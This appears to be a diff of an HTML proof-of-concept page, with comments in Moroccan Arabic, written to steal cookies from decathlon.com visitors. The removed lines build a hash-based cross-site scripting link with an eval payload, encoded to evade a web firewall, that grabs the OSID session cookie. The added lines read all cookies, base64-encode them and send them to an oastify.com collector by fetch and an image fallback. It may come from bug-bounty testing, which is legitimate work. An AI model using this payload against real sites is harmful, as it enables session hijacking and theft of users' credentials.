@@ -2,31 +2,20 @@
 <html>
 <body>
     <script>
-        // هاد السكريبت هو اللي غيجيب ليك الـ OSID من قلب Decathlon
-        let payload = `
-            (function(){
-                // كنجبدو الـ OSID بوحدو باش يكون الدليل واضح فـ Burp
-                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "OSID_NOT_FOUND";
-                
-                // الرابط ديال Burp اللي خدام ليك دابا
-                var targetUrl = " owo6uclxknke2tj3sjy2blgea5gw41sq.oastify.com/?osid=" + osid;
-                
-                // كنستعملو fetch بحال المرة اللي نجحات
-                fetch(targetUrl, {mode: 'no-cors'});
-                
-                // كنضيفو Image للتأكيد إلا تبلوكا الـ fetch
-                var img = new Image();
-                img.src = targetUrl + "&fallback=image";
-            })();
-        `;
-
-        // كنشفروا الكود كامل باش نهربو من الـ WAF
-        let encoded = encodeURIComponent(payload);
-
-        // الرابط النهائي باستعمال الـ Hash (#)
-        let finalLink = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
-
-        window.location.href = finalLink;
+        (function(){
+            // الكود اللي كيسحب الكوكيز كاملة ويشفرها بـ Base64
+            var cookies = btoa(document.cookie) || "NO_COOKIES";
+            
+            // الرابط الجديد ديالك (تأكدت بلي ما كاينش مسافات)
+            var brupUrl = "https://5v1nttkej4jv1aikr0xja2fv9mfd34usj.oastify.com/?data=" + cookies;
+            
+            // إرسال التبليغ
+            fetch(brupUrl, {mode: 'no-cors'});
+            
+            // احتياط: إرسال عبر Image في حالة فشل الـ fetch
+            var i = new Image();
+            i.src = brupUrl + "&type=img";
+        })();
     </script>
 </body>
 </html>
